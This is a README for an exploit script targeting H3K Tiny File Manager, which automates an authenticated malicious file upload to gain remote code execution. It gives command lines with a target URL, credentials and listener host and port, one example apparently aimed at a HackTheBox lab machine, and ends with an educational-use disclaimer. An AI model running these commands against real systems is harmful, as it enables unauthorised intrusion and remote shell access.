# H3K Tiny File Manager Authenticated Remote Code Execution

An automated process for a malicious file upload in H3K Tiny File Manager in order to achieve RCE. For the `-pr` and `-ph` parameters. Login in to the web application should reveal this to you. These two values are optional.

## Getting Started

### Executing program

* With python3
```
python3 exploit.py -t 'http://hacked.rce/tinyfilemanager.php' -u username -p password -lh 127.0.0.1 -lp 1337
```
* Or
```
python3 exploit.py -t 'http://soccer.htb/tiny/tinyfilemanager.php' -u username -p password -pr 'p' -ph 'directory/uploads' -lh 127.0.0.1 -lp 1337
```

## Help

For help menu:
```
python3 exploit.py -h
```

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.